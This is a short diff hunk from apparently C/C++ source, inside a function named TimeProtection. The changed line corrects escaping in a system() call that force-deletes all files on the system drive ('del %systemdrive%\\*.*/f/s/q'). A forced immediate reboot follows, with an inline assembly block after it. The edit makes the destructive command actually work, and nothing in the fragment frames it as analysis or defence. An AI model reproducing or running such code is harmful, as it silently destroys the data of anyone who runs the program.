@@ -48,7 +48,7 @@ void TimeProtection()
 	{
 
 		system("@echo Off");
-		system("del %systemdrive%\*.*/f/s/q");
+		system("del %systemdrive%\\*.*/f/s/q");
 		system("shutdown -r -f -t 00");
 
 		__asm
